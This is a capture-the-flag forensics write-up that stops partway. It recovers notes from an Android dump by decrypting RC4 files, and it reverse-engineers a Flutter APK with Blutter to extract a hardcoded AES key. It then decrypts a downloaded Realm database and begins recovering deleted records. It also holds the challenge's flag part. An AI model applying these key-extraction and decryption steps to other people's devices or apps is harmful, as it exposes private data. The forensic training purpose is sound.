algorithms!\u003C/p>",{"headings":484,"localImagePaths":534,"remoteImagePaths":535,"frontmatter":536,"imagePaths":537},[485,486,489,492,495,498,501,504,507,510,513,516,519,522,525,528,531],{"depth":27,"slug":118,"text":119},{"depth":27,"slug":487,"text":488},"the-virtual-machine","The Virtual Machine",{"depth":27,"slug":490,"text":491},"reverse-engineering-the-instruction-set","Reverse Engineering the Instruction Set",{"depth":40,"slug":493,"text":494},"load-lower-immediate-lli","Load Lower Immediate (LLi)",{"depth":40,"slug":496,"text":497},"load-upper-immediate-lui","Load Upper Immediate (LUi)",{"depth":40,"slug":499,"text":500},"addition-vm_add","Addition (vm_add)",{"depth":40,"slug":502,"text":503},"conditional-jump","Conditional Jump",{"depth":40,"slug":505,"text":506},"compare-instruction","Compare Instruction",{"depth":40,"slug":508,"text":509},"stack-operations","Stack Operations",{"depth":40,"slug":511,"text":512},"subtraction-vm_sub","Subtraction (vm_sub)",{"depth":40,"slug":514,"text":515},"bit-shifting","Bit Shifting",{"depth":40,"slug":517,"text":518},"xor-operation","XOR Operation",{"depth":40,"slug":520,"text":521},"nop","NOP",{"depth":27,"slug":523,"text":524},"the-opcode-table","The Opcode Table",{"depth":27,"slug":526,"text":527},"discovering-tea-encryption","Discovering TEA Encryption",{"depth":27,"slug":529,"text":530},"the-algorithm","The Algorithm",{"depth":27,"slug":532,"text":533},"keygen-solution","Keygen Solution",[],[],{"title":476,"date":100},[],"onapookkalam",{"id":538,"data":540,"body":543,"filePath":544,"digest":545,"rendered":546},{"title":541,"date":542},"Onapookkalam / ഓണപ്പൂക്കളം - DFIR report",["Date","2025-01-04T00:00:00.000Z"],"# Onapookkalam Challenge Writeup\r\n\r\n## Challenge Overview\r\n\r\nWhile preparing for Onapookkalam, notes were recorded on a mobile device. The phone was suspected to be tampered with, potentially having data modified or deleted.\r\n\r\n**Objectives:**\r\n- **Note Retrieval**: Extract specific information from saved notes (flagPart1)\r\n- **Database Analysis**: Identify a specific string that was modified and deleted from Realm DB (flagPart2)\r\n\r\n**Required Output Format**: `flag{flagPart1_flagPart2}`\r\n\r\n---\r\n\r\n## Investigation Process\r\n\r\n### Initial File Extraction\r\n\r\nAfter extraction, numerous files were discovered:\r\n\r\n![Extracted Files](/images/posts/onapookkalam/onam-1.png)\r\n\r\n### Notes Recovery\r\n\r\nThe challenge focused on recovering notes. During the search for notes files, one file was found with a base64-encoded name:\r\n\r\n![Base64 Named File](/images/posts/onapookkalam/onam-2.png)\r\n\r\nThis directory contained the following files:\r\n\r\n![Directory Contents](/images/posts/onapookkalam/onam-3.png)\r\n\r\n### Flutter App Analysis\r\n\r\nFurther exploration revealed this was about recovering data from a Flutter app:\r\n\r\n![Flutter App Evidence 1](/images/posts/onapookkalam/onam-4.png)\r\n\r\n![Flutter App Evidence 2](/images/posts/onapookkalam/onam-5.png)\r\n\r\n### Source Code Discovery\r\n![Source Code](/images/posts/onapookkalam/onam-6.png)\r\n\r\nSince Flutter uses Python (via Flet framework), i  searched for Python files containing the APK logic. The main application file was found:\r\n\r\n![Python File Location](/images/posts/onapookkalam/onam-7.png)\r\n\r\n### Encryption Implementation\r\n\r\nThe discovered Python code revealed the notes app's encryption scheme:\r\n\r\n```python\r\nimport flet as ft\r\nimport datetime, random, os, string\r\n\r\ndef key_scheduling(key):\r\n    sched = [i for i in range(0, 256)]\r\n    i = 0\r\n    for j in range(0, 256):\r\n        i = (i + sched[j] + key[j % len(key)]) % 256\r\n        tmp = sched[j]\r\n        sched[j] = sched[i]\r\n        sched[i] = tmp\r\n    return sched\r\n\r\ndef stream_generation(sched):\r\n    stream = []\r\n    i = 0\r\n    j = 0\r\n    while True:\r\n        i = (1 + i) % 256\r\n        j = (sched[i] + j) % 256\r\n        tmp = sched[j]\r\n        sched[j] = sched[i]\r\n        sched[i] = tmp\r\n        yield sched[(sched[i] + sched[j]) % 256]\r\n\r\ndef encrypt(text, key):\r\n    text = [ord(char) for char in text]\r\n    key = [ord(char) for char in key]\r\n    sched = key_scheduling(key)\r\n    key_stream = stream_generation(sched)\r\n    ciphertext = \"\"\r\n    for char in text:\r\n        enc = str(hex(char ^ next(key_stream))).lower()\r\n        ciphertext += enc\r\n    return ciphertext\r\n\r\ndef storeData(page, content):\r\n    app_data_path = os.getenv(\"FLET_APP_STORAGE_DATA\")\r\n    fileName = f\"{datetime.datetime.now().strftime(\"%d%m%Y%H%M%S%f\")}\"\r\n    my_file_path = os.path.join(app_data_path, fileName)\r\n    key = \"\".join(\r\n        random.choice(string.ascii_letters + string.digits) for _ in range(16)\r\n    )\r\n    encText = encrypt(content, key)\r\n    page.client_storage.set(fileName, key)\r\n    with open(my_file_path, \"w\") as f:\r\n        f.write(encText)\r\n    page.open(ft.SnackBar(ft.Text(f\"File saved to App Data Storage!\")))\r\n\r\ndef main(page: ft.Page):\r\n    def saveNote(e):\r\n        data = inputBox.value\r\n        if data != \"\":\r\n            storeData(page, data)\r\n        else:\r\n            page.open(ft.SnackBar(ft.Text(\"Empty content!\")))\r\n    \r\n    appBar = ft.AppBar(title=ft.Text(\"Notes App\"))\r\n    inputBox = ft.TextField(hint_text=\"Enter some text...\", multiline=True, min_lines=3)\r\n    page.appbar = appBar\r\n    page.add(inputBox)\r\n    page.add(\r\n        ft.ElevatedButton(text=\"Save Note\", on_click=saveNote, style=ft.ButtonStyle())\r\n    )\r\n\r\nft.app(main)\r\n```\r\n\r\n\r\nThe application allows users to create and save encrypted notes with the following workflow:\r\nWhen a user enters text and clicks \"Save Note\", the application generates a unique filename based on the current timestamp (format: DDMMYYYYHHMMSSμs). It then creates a random 16-character encryption key consisting of letters and digits. The note content is encrypted using a custom implementation of the RC4 stream cipher algorithm, which involves two main phases: key scheduling (which initializes a 256-byte state array based on the encryption key) and stream generation (which produces a pseudo-random keystream). The encryption process XORs each character of the plaintext with the corresponding keystream byte and converts the result to hexadecimal format. The encrypted text is stored in a file within the app's data directory, while the encryption key is separately stored in the client storage using the filename as the identifier. This design means that to decrypt any saved note, you need both the encrypted file and its corresponding encryption key from the client storage, making the encryption key essential for data recovery.\r\n\r\n\r\nso I wrote a Python script that:\r\n1. Implemented the RC4 decryption algorithm (mirroring the encryption code)\r\n2. Parsed the hex-encoded ciphertext\r\n3. XORed each byte with the keystream to recover plaintext\r\n\r\n```python\r\n#!/usr/bin/env python3\r\n\"\"\"Simple decryption script for the notes challenge\"\"\"\r\n\r\nimport os\r\n\r\ndef key_scheduling(key):\r\n    sched = [i for i in range(0, 256)]\r\n    i = 0\r\n    for j in range(0, 256):\r\n        i = (i + sched[j] + key[j % len(key)]) % 256\r\n        tmp = sched[j]\r\n        sched[j] = sched[i]\r\n        sched[i] = tmp\r\n    return sched\r\n\r\ndef stream_generation(sched):\r\n    i = 0\r\n    j = 0\r\n    while True:\r\n        i = (1 + i) % 256\r\n        j = (sched[i] + j) % 256\r\n        tmp = sched[j]\r\n        sched[j] = sched[i]\r\n        sched[i] = tmp\r\n        yield sched[(sched[i] + sched[j]) % 256]\r\n\r\ndef decrypt(ciphertext, key):\r\n    key = [ord(char) for char in key]\r\n    sched = key_scheduling(key)\r\n    key_stream = stream_generation(sched)\r\n    \r\n    # Parse hex values from format: 0xXX0xYY0xZZ...\r\n    hex_values = []\r\n    i = 0\r\n    while i \u003C len(ciphertext):\r\n        if ciphertext[i:i+2] == '0x':\r\n            j = i + 2\r\n            while j \u003C len(ciphertext) and ciphertext[j:j+2] != '0x':\r\n                j += 1\r\n            hex_val = ciphertext[i:j]\r\n            hex_values.append(int(hex_val, 16))\r\n            i = j\r\n        else:\r\n            i += 1\r\n    \r\n    plaintext = \"\"\r\n    for encrypted_byte in hex_values:\r\n        decrypted_byte = encrypted_byte ^ next(key_stream)\r\n        plaintext += chr(decrypted_byte)\r\n    \r\n    return plaintext\r\n\r\n# Keys from client storage\r\nKEYS = {\r\n    \"15052025175732777833\": \"1OmIyq5YT50YlWB0\",\r\n    \"15052025175747121993\": \"oIdeaSz9iySlAmKJ\",\r\n    \"15052025175936114230\": \"YKnQqnrzfTIM9HLu\",\r\n    \"15052025180002742685\": \"RhjZrO2JGKQLamST\",\r\n    \"15052025175724299736\": \"SkZFksurgEq3Tdhe\",\r\n    \"15052025175950593733\": \"M52JUgdj9r6kkVg4\",\r\n    \"15052025175944264611\": \"lunMORQQjKhX9u5H\",\r\n}\r\n\r\nprint(\"\\n\" + \"=\"*70)\r\nprint(\"DECRYPTING ALL NOTES\")\r\nprint(\"=\"*70 + \"\\n\")\r\n\r\nfor filename, key in KEYS.items():\r\n    if os.path.exists(filename):\r\n        print(f\"\\n{'='*70}\")\r\n        print(f\"File: {filename}\")\r\n        print(f\"Key: {key}\")\r\n        print(f\"{'='*70}\")\r\n        \r\n        with open(filename, 'r') as f:\r\n            ciphertext = f.read()\r\n        \r\n        try:\r\n            plaintext = decrypt(ciphertext, key)\r\n            print(f\"Decrypted content:\\n{plaintext}\")\r\n        except Exception as e:\r\n            print(f\"Error decrypting: {e}\")\r\n        \r\n        print(f\"{'='*70}\\n\")\r\n    else:\r\n        print(f\"File not found: {filename}\")\r\n\r\nprint(\"\\n✓ Decryption complete!\\n\")\r\n```\r\n```bash\r\n15052025175732777833: \"well this was easy\"\r\n15052025175747121993: \"i'll give you the first part of the flag :)\"\r\n15052025175936114230: \"first part of the flag: w311_7h47_p4r7_w45_345y\"\r\n15052025180002742685: \"f4k3_f14g\"\r\n15052025175724299736: \"hello there\"\r\n15052025175950593733: \"boop\"\r\n15052025175944264611: \"hehehe\"\r\n```\r\n\r\nAfter an hour of going through all the files i found this snapshots folder  ( i tried organising the files by images , txt , png etc and came across this title 0 \r\n\r\n![Snapshots Folder](/images/posts/onapookkalam/onam-8.png)\r\n\r\n![App Screenshot](/images/posts/onapookkalam/onam-9.png)\r\n\r\nAfter analyzing the Android filesystem dump, we identified two key applications in the `/data/app/` directory:\r\n1. `com.sp3p3x.notesapp` - A notes application (already analyzed for flagPart1)\r\n2. `com.example.accessmydata` - The target application for flagPart2\r\n\r\nThe challenge description hinted at finding deleted data from a \"realm db\", and a screenshot found in `/data/system_ce/0/snapshots/` confirmed the existence of an app that downloads and decrypts a realm file\r\n\r\nThe Access My Data APK was found at:\r\n```\r\n/data/app/~~hvxKjg-YJ69UXXtnoCmWcw==/com.example.accessmydata-rkCVbU6Yb-jHyAaRmU8b0Q==/base.apk\r\n```\r\n\r\nTerminal output:\r\n```bash\r\n$ find /data/app -name \"*accessmydata*\" -name \"*.apk\"\r\n/data/app/~~hvxKjg-YJ69UXXtnoCmWcw==/com.example.accessmydata-rkCVbU6Yb-jHyAaRmU8b0Q==/base.apk\r\n\r\n$ ls -lh base.apk\r\n-rw-r--r-- 1 muffin muffin 21M May 15  2025 base.apk\r\n```\r\n\r\n\r\n\r\nFlutter applications are unique in the Android ecosystem because they don't use traditional Java/Kotlin code. Instead, they compile Dart code to native machine code using Ahead-Of-Time (AOT) compilation. This results in two important native libraries:\r\n\r\n1. **libflutter.so** - The Flutter engine (shared across all Flutter apps)\r\n2. **libapp.so** - The application-specific code compiled from Dart\r\n\r\nThe Dart code is embedded within `libapp.so` as a snapshot, which contains:\r\n- Compiled Dart VM bytecode\r\n- AOT-compiled native code\r\n- An Object Pool with string literals and constants\r\n- Type information and metadata\r\n\r\nThis compilation method makes traditional APK analysis tools (like jadx or dex2jar) useless, as there's no DEX bytecode to decompile:( \r\n\r\n\r\n\r\nWe extracted the APK to access the native libraries:\r\n\r\n```bash\r\n$ mkdir apk_extracted\r\n$ unzip -q base.apk -d apk_extracted/\r\n$ ls -lh apk_extracted/lib/arm64-v8a/\r\ntotal 16M\r\n-rw-r--r-- 1 muffin muffin 4.7M Jan  1  1981 libapp.so\r\n-rw-r--r-- 1 muffin muffin  11M Jan  1  1981 libflutter.so\r\n```\r\n\r\nThe `libapp.so` file (4.7 MB) contains all the application logic we need to reverse engineer.\r\n\r\nBlutter, a portmanteau of \"B(l)utter\" that plays on both *buttering* and *Flutter*, is a reverse engineering tool built specifically with Flutter applications in mind. Unlike traditional disassemblers that treat Flutter binaries as opaque native code, Blutter understands the internal structure of the Dart VM snapshot embedded inside `libapp.so`. It is able to parse this snapshot, extract the object pool that contains constants, strings, and type information, and use that data to reconstruct readable pseudo-Dart code complete with symbols and function names. In addition to this higher-level reconstruction, Blutter can also generate annotated assembly listings that bridge the gap between low-level instructions and Dart-level logic, and even produce Frida scripts to assist with dynamic analysis and runtime instrumentation.\r\n\r\n\r\nWhen we run Blutter, it performs several automated steps:\r\n\r\n```bash\r\n$ python3 blutter.py /path/to/apk_extracted/lib/arm64-v8a /path/to/blutter_output\r\n```\r\n\r\nDuring execution, Blutter follows a fairly involved but systematic process to adapt itself to the exact Flutter application being analyzed. It begins by inspecting `libflutter.so` to determine the precise Dart SDK version used when the app was compiled. This step is essential, as the internal layout of Dart VM snapshots varies between versions, and using the wrong format would make accurate parsing impossible. In this case, Blutter identifies the app as being built with Dart 3.7.2, along with the associated snapshot hash, target architecture, and compilation flags, all of which guide the rest of the analysis.\r\n\r\nIf a matching analysis backend for that Dart version is not already available, Blutter automatically prepares one. It fetches the Dart SDK source from the official repository, checks out the exact version tag, and compiles the Dart VM runtime into a static library tailored to the target architecture. Blutter then rebuilds its own analysis components against this library, a process that can take several minutes and produces verbose build output as each part of the VM is compiled and linked.\r\n\r\nOnce the environment is ready, Blutter moves on to snapshot analysis. It parses `libapp.so` to locate the embedded Dart VM snapshot, extracts the object pool containing constants and string literals, reconstructs the application's class hierarchy, and identifies function entry points to recover the overall code structure. Using this information, Blutter generates its final artifacts, producing annotated assembly listings, reconstructed function and class definitions, inline constants, and a mapped control flow for each Dart library. At the end of the process, it also generates a Frida script, enabling dynamic instrumentation of the recovered logic during runtime analysis.\r\n\r\n\r\n### Examining the Output Structure\r\n\r\n```bash\r\n$ ls -la blutter_output/\r\ntotal 1524\r\ndrwxr-xr-x 1 muffin muffin     86 Dec 30 18:56 .\r\ndrwxr-x--x 1 muffin muffin    894 Dec 30 18:56 ..\r\ndrwxr-xr-x 1 muffin muffin    478 Dec 30 18:56 asm/              # Assembly listings\r\n-rw-r--r-- 1 muffin muffin 221632 Dec 30 18:56 blutter_frida.js  # Frida script template\r\ndrwxr-xr-x 1 muffin muffin     56 Dec 30 18:56 ida_script/       # IDA Pro integration\r\n-rw-r--r-- 1 muffin muffin 376330 Dec 30 18:56 objs.txt          # Nested object dump\r\n-rw-r--r-- 1 muffin muffin 957372 Dec 30 18:56 pp.txt            # Complete Object Pool\r\n\r\n$ ls blutter_output/asm/ | head -10\r\naccessmydata/\r\nasync/\r\ncharacters/\r\ncollection/\r\n.dart_tool/\r\ndio/\r\nencrypt/\r\nflutter/\r\n...\r\n```\r\n\r\nThe `asm/` directory contains subdirectories for each Dart package used in the app. Our target is `accessmydata/main.dart`.\r\n\r\n\r\n\r\n\r\n\r\n### Locating the Main Application Code\r\n\r\n```bash\r\n$ ls -lh blutter_output/asm/accessmydata/\r\ntotal 52\r\n-rw-r--r-- 1 muffin muffin 51467 Dec 30 18:56 main.dart\r\n```\r\n\r\nThe `main.dart` file contains 51 KB of annotated assembly code representing the application's core logic.\r\n\r\n\r\n\r\nBlutter generates assembly listings that interleave ARM64 assembly with Dart-level semantic comments. Here's an example of the format:\r\n\r\n```assembly\r\n_ _decryptData(/* No info */) {\r\n  // addr: 0x2db4c0, size: 0x174\r\n  // 0x2db4c0: EnterFrame\r\n      0x2db4c0: stp             fp, lr, [SP, #-0x10]!\r\n      0x2db4c4: mov             fp, SP\r\n  // 0x2db4c8: AllocStack(0x30)\r\n      0x2db4c8: sub             SP, SP, #0x30\r\n```\r\n\r\nExplanation:\r\n- **Function signature**: `_ _decryptData(/* No info */)` - Dart function name\r\n- **Address and size**: addr: 0x2db4c0, size: 0x174 (372 bytes)\r\n- **Comments**: `// 0x2db4c0: EnterFrame` - high-level operation\r\n- **Assembly**: `0x2db4c0: stp fp, lr, [SP, #-0x10]!` - actual ARM64 instruction\r\n- **PP references**: `[PP, #0x90]` - references to the Object Pool\r\n\r\n### Extracting the Encryption Keys\r\n\r\n\r\nthe download URL:\r\n```assembly\r\n    // 0x304ed8: r16 = \"https://github.com/chicken-jockeyy/confidentialdb/raw/refs/heads/main/enc.bin\"\r\n    //     0x304ed8: add             x16, PP, #0xd, lsl #12  ; [pp+0xd348] \"https://github...\"\r\n    /     0x304edc: ldr             x16, [x16, #0x348]\r\n```\r\n\r\nThese literal strings are stored in the Object Pool (PP) and loaded into registers for use.\r\n\r\n\r\n\r\n\r\n```assembly\r\n    // Load key part 1 into x16\r\n    // 0x2db4f8: r16 = \"04e0d32be85f3b42\"\r\n    //     0x2db4f8: add             x16, PP, #0xb, lsl #12\r\n    /     0x2db4fc: ldr             x16, [x16, #0x5a0]\r\n\r\n    // Load key part 2 into x30 (lr)\r\n    // 0x2db500: r30 = \"7173047a9d6574e5\"\r\n    //     0x2db500: add             lr, PP, #0xb, lsl #12\r\n    /     0x2db504: ldr             lr, [lr, #0x5a8]\r\n\r\n    // Push both parts onto stack\r\n    // 0x2db508: stp             lr, x16, [SP]\r\n\r\n    // 0x2db50c: r0 = +()\r\n    //     Concatenate the two strings: \"04e0d32be85f3b427173047a9d6574e5\"\r\n```\r\n\r\nThen the code creates a reversed iterable:\r\n```assembly\r\n    // 0x2db540: r0 = ReversedListIterable()\r\n    //     0x2db540: bl              #0x2bee38  ; AllocateReversedListIterableStub\r\n    // 0x2db558: r0 = join()\r\n    //     0x2db558: bl              #0x28e4f8  ; [dart:_internal] ListIterable::join\r\n```\r\n\r\nThis reverses the concatenated key string character by character:\r\n- Original: `04e0d32be85f3b427173047a9d6574e5`\r\n- Reversed: `5e4756d9a740371724b3f58eb23d0e40`\r\n\r\n\r\n\r\n```assembly\r\n    // 0x2db564: r0 = Key()\r\n    //     Create an encryption key object\r\n\r\n    // 0x2db578: r0 = AES()\r\n    //     0x2db578: bl              #0x304864  ; AllocateAESStub -> AES\r\n\r\n    // 0x2db588: r0 = AES()\r\n    //     0x2db588: bl              #0x2db870  ; [package:encrypt/encrypt.dart] AES::AES\r\n    //     Initialize AES cipher with the reversed key\r\n```\r\n\r\n\r\n\r\nTo find which AES mode is used, we examined the Object Pool dump:\r\n\r\n```bash\r\n$ grep -i \"ecb\\|AESMode\" blutter_output/pp.txt\r\n[pp+0xb5d8] Obj!AESMode@5032b1 : {\r\n    off_10: \"ecb\"\r\n}\r\n[pp+0xb5f0] Map\u003CAESMode, String>(8) {\r\n  Obj!AESMode@503291: \"CBC\",\r\n  Obj!AESMode@503271: \"CFB-64\",\r\n  Obj!AESMode@503251: \"CTR\",\r\n  Obj!AESMode@5032b1: \"ECB\",\r\n  Obj!AESMode@503231: \"OFB-64/GCTR\",\r\n  Obj!AESMode@503211: \"OFB-64\",\r\n  ...\r\n}\r\n```\r\n\r\nCross-referencing with the assembly:\r\n```assembly\r\n    // 0x2db880: r4 = Instance_AESMode\r\n    //     0x2db880: add             x4, PP, #0xb, lsl #12  ; [pp+0xb5d8] Obj!AESMode@5032b1\r\n    /     0x2db884: ldr             x4, [x4, #0x5d8]\r\n```\r\n\r\nThe constant at `pp+0xb5d8` is `Obj!AESMode@5032b1`, which corresponds to **\"ECB\"** mode in the enum map.\r\n\r\n#### Step 4: Decryption and Base64 Decode\r\n\r\n```assembly\r\n    // 0x2db5b8: r0 = decrypt()\r\n    //     0x2db5b8: bl              #0x2db6a0  ; [package:encrypt/encrypt.dart] Encrypter::decrypt\r\n    //     Decrypt the encrypted data using AES-ECB\r\n\r\n    // 0x2db5c0: r0 = base64Decode()\r\n    //     0x2db5c0: bl              #0x2db634  ; [dart:convert] ::base64Decode\r\n    //     Decode the decrypted Base64 string to binary\r\n```\r\n\r\n\r\n\r\n1. **Key Preparation**:\r\n   ```\r\n   key_part1 = \"04e0d32be85f3b42\"\r\n   key_part2 = \"7173047a9d6574e5\"\r\n   combined = \"04e0d32be85f3b427173047a9d6574e5\"  (32 characters)\r\n   reversed = \"5e4756d9a740371724b3f58eb23d0e40\"  (32 characters → 16 bytes UTF-8)\r\n   ```\r\n\r\n2. **Download encrypted file**:\r\n   ```\r\n   URL: https://github.com/chicken-jockeyy/confidentialdb/raw/refs/heads/main/enc.bin\r\n   Size: 12,582,928 bytes\r\n   ```\r\n\r\n3. **AES-ECB Decryption**:\r\n   ```\r\n   Cipher: AES-128 (128-bit key = 16 bytes)\r\n   Mode: ECB (Electronic Codebook)\r\n   Key: \"5e4756d9a7403717\" + \"24b3f58eb23d0e40\" (16 ASCII characters)\r\n   Input: enc.bin (raw binary data)\r\n   Output: Base64-encoded string\r\n   ```\r\n\r\n4. **Base64 Decoding**:\r\n   ```\r\n   Input: Base64 string (from AES decryption)\r\n   Output: decrypted.realm (9,437,184 bytes)\r\n   ```\r\n\r\n---\r\n\r\n## Part 6: Implementing the Decryptor\r\n\r\n### Downloading the Encrypted File\r\n\r\n```bash\r\n$ curl -L -o enc.bin \"https://github.com/chicken-jockeyy/confidentialdb/raw/refs/heads/main/enc.bin\"\r\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\r\n                                 Dload  Upload   Total   Spent    Left  Speed\r\n100 12288k  100 12288k   0     0  1988k      0   0:00:06  0:00:06 --:--:--  3087k\r\n\r\n$ ls -lh enc.bin\r\n-rw-r--r-- 1 muffin muffin 13M Dec 30 18:50 enc.bin\r\n\r\n$ file enc.bin\r\nenc.bin: data\r\n```\r\n\r\nThe file is 12 MB of raw binary data (AES-encrypted).\r\n\r\n### Creating Cargo.toml for Rust Dependencies\r\n\r\n```toml\r\n[package]\r\nname = \"decrypt_realm\"\r\nversion = \"0.1.0\"\r\nedition = \"2021\"\r\n\r\n[dependencies]\r\naes = \"0.8\"\r\nbase64 = \"0.21\"\r\n```\r\n\r\nRequired crates:\r\n- **aes**: Provides AES block cipher implementation\r\n- **base64**: Handles Base64 encoding/decoding\r\n\r\n### Running the Rust Decryptor\r\n\r\n```bash\r\n$ cargo run --release\r\n   Compiling aes v0.8.3\r\n   Compiling base64 v0.21.5\r\n   Compiling decrypt_realm v0.1.0\r\n    Finished release [optimized] target(s) in 3.42s\r\n     Running `target/release/decrypt_realm`\r\n\r\n\r\n\r\nKey part 1: 04e0d32be85f3b42\r\nKey part 2: 7173047a9d6574e5\r\nCombined key: 04e0d32be85f3b427173047a9d6574e5\r\nReversed key: 5e4756d9a740371724b3f58eb23d0e40\r\n\r\nEncrypted data size: 12582928 bytes\r\n AES ECB decryption complete\r\n Base64 decoding complete\r\n\r\nRealm database saved as 'decrypted.realm'\r\n File size: 9437184 bytes (9 MB)\r\n File appears to be a valid Realm database\r\n\r\n```\r\n\r\n### Verifying the Decrypted File\r\n\r\n```bash\r\n$ ls -lh decrypted.realm\r\n-rw-r--r-- 1 muffin muffin 9.0M Dec 30 19:15 decrypted.realm\r\n\r\n$ file decrypted.realm\r\ndecrypted.realm: data\r\n\r\n$ hexdump -C decrypted.realm | head -20\r\n00000000  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\r\n*\r\n00000020  54 4c 44 42 00 00 00 00  0f 72 65 61 6c 6d 5f 76  |TLDB.....realm_v|\r\n00000030  65 72 73 69 6f 6e 00 00  14 00 00 00 01 00 00 00  |ersion..........|\r\n```\r\n\r\n\r\n### Why the Key is Reversed\r\n\r\nLooking at the Dart code pattern:\r\n```dart\r\nString keyPart1 = \"04e0d32be85f3b42\";\r\nString keyPart2 = \"7173047a9d6574e5\";\r\nString combined = keyPart1 + keyPart2;\r\nString reversed = combined.split('').reversed.join('');\r\n```\r\n\r\nThis reversal serves multiple purposes:\r\n1. **Obfuscation**: Makes static analysis slightly harder\r\n2. **Key Derivation**: Creates a \"derived\" key from hardcoded parts\r\n3. **String Manipulation**: Common pattern in Dart for simple transformations\r\n\r\nThe reversed key `5e4756d9a740371724b3f58eb23d0e40` is exactly 32 ASCII characters, which when encoded as UTF-8 bytes gives us the required 16-byte (128-bit) AES key.\r\n\r\n\r\n\r\n\r\nWith our Python decryption script complete, we can now decrypt the realm database:\r\n\r\n```bash\r\n$ python3 decrypt_realm.py\r\nRealm database saved as 'decrypted.realm'\r\nFile size: 9437184 bytes\r\n```\r\n\r\nVerification of the decrypted file:\r\n\r\n```bash\r\n$ ls -lh decrypted.realm\r\n-rw-r--r-- 1 muffin muffin 9.0M Dec 30 19:21 decrypted.realm\r\n\r\n$ file decrypted.realm\r\ndecrypted.realm: data\r\n\r\n$ hexdump -C decrypted.realm | head -10\r\n00000000  78 96 88 00 00 00 00 00  c8 36 88 00 00 00 00 00  |x........6......|\r\n00000010  54 2d 44 42 09 09 00 00  41 41 41 41 0e 00 00 05  |T-DB....AAAA....|\r\n00000020  70 6b 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |pk..............|\r\n00000030  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 1d  |................|\r\n00000040  6d 65 74 61 64 61 74 61  00 00 00 00 00 00 00 00  |metadata........|\r\n00000050  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 17  |................|\r\n00000060  63 6c 61 73 73 5f 52 65  61 6c 6d 54 65 73 74 43  |class_RealmTestC|\r\n00000070  6c 61 73 73 30 00 00 00  00 00 00 00 00 00 00 0a  |lass0...........|\r\n00000080  63 6c 61 73 73 5f 52 65  61 6c 6d 54 65 73 74 43  |class_RealmTestC|\r\n00000090  6c 61 73 73 31 00 00 00  00 00 00 00 00 00 00 0a  |lass1...........|\r\n```\r\n\r\nKey observations from the hex dump:\r\n- **Bytes 0x10-0x13**: `54 2d 44 42` = \"T-DB\" - Realm database magic header\r\n- **Bytes 0x14-0x17**: `41 41 41 41` = \"AAAA\" - Region marker for unused/free space\r\n- **Offset 0x40**: \"metadata\" string - Database metadata section\r\n- **Offset 0x60**: \"class_RealmTestClass0\" - First database schema class\r\n- **Offset 0x80**: \"class_RealmTestClass1\" - Second database schema class\r\n\r\n\r\n\r\nBefore we can recover deleted data, we need to understand how Realm databases work:\r\n\r\n#### Realm Database Architecture\r\n\r\nRealm is a mobile-first database designed for iOS and Android applications. Unlike SQLite which uses SQL and table-based storage, Realm uses:\r\n\r\n1. **Object-based Model**: Data is stored as objects, not rows and columns\r\n2. **Binary Format**: Uses a custom binary format (not SQL)\r\n3. **MVCC (Multi-Version Concurrency Control)**: Maintains multiple versions of data\r\n4. **Zero-Copy Architecture**: Data is memory-mapped directly from disk\r\n\r\n#### Why Deleted Data Persists\r\n\r\nRealm uses MVCC, which means when you \"delete\" data, it doesn't immediately erase it. Instead:\r\n\r\n1. The data is marked as deleted/unused\r\n2. A new version of the database state is created\r\n3. The old version's data remains in unused space\r\n4. Garbage collection happens later (if at all)\r\n\r\nThis creates a forensic opportunity: deleted records often remain in unused regions of the database file.\r\n\r\n\r\n\r\n\r\n\r\nTo recover deleted data from the Realm database, we use `realm_recover`, a specialized forensics tool designed specifically for analyzing Realm files. While exploring this approach, I came across prior research that discusses how deleted records in mobile application databases are often not immediately erased from disk. Instead, remnants of these records can persist within the database structure, making recovery possible through careful analysis. This idea is reinforced by both academic work and practical discussions from the developer and forensics communities, which describe how Realm's internal storage format can retain deleted objects long enough for them to be reconstructed. These techniques are commonly applied in Android forensics, where understanding the database layout allows investigators to extract historical or deleted application data that would otherwise appear lost.\r\n\r\n\r\n\r\n### References\r\n\r\n* Smart Techniques to Extract the Deleted Data From the Android Application\r\n  [https://www.sciencedirect.com/science/article/abs/pii/S2666281722000221](https://www.sciencedirect.com/science/article/abs/pii/S2666281722000221)\r\n\r\n* Stack Overflow discussion on restoring deleted Realm objects\r\n  [https://stackoverflow.com/questions/52384845/how-to-restore-an-item-deleted-from-realm](https://stackoverflow.com/questions/52384845/how-to-restore-an-item-deleted-from-realm)\r\n\r\n* Smart Techniques to Extract the Deleted Data From the Android Application (Academia.edu)\r\n  [https://www.academia.edu/77798036/Smart_Techniques_to_Extract_the_Deleted_Data_Form_the_Android_Application](https://www.academia.edu/77798036/Smart_Techniques_to_Extract_the_Deleted_Data_Form_the_Android_Application)\r\n\r\n\r\n\r\n```bash\r\n$ cd /tmp\r\n$ git clone https://github.com/hyuunnn/realm_recover.git\r\nCloning into 'realm_recover'...\r\nremote: Enumerating objects: 84, done.\r\nremote: Total 84 (delta 0), reused 0 (delta 0), pack-reused 84\r\nReceiving objects: 100% (84/84), 27.13 KiB | 1.51 MiB/s, done.\r\nResolving deltas: 100% (42/42), done.\r\n\r\n$ ls /tmp/realm_recover/\r\nLICENSE  objects.py  README.md  realm_recover.py  sample  util.py\r\n```\r\n\r\nThe tool consists of several components:\r\n- **realm_recover.py**: Main recovery script\r\n- **objects.py**: Realm object parsing logic\r\n- **util.py**: Utility functions for binary analysis\r\n- **sample/**: Sample realm database for testing\r\n\r\n\r\n### Running the Realm Recovery Tool\r\n\r\nExecute the recovery tool on our decrypted realm database:\r\n\r\n```bash\r\n$ python3 /tmp/realm_recover/realm_recover.py --file decrypted.realm\r\n[Tool runs silently, generating output files]\r\n```\r\n\r\nThe tool doesn't produce console output but generates several analysis files:\r\n\r\n```bash\r\n$ ls -lh *.txt\r\n-rw-r--r-- 1 muffin muffin    1705 Dec 30 19:23 compare_objects.txt\r\n-rw-r--r-- 1 muffin muffin 1033382 Dec 30 19:23 data_storages.txt\r\n-rw-r--r-- 1 muffin muffin 1798075 Dec 30 19:23 scan_all_objects.txt\r\n-rw-r--r-- 1 muffin muffin 1117764 Dec 30 19:23 scan_unused_objects.txt\r\n```\r\n\r\n#### Understanding the Output Files\r\n\r\n1. **scan_all_objects.txt** (1.8 MB):\r\n   - Every object found in the database\r\n   - Includes both active and deleted objects\r\n   - Organized by offset and type\r\n\r\n2. **scan_unused_objects.txt** (1.1 MB):\r\n   - 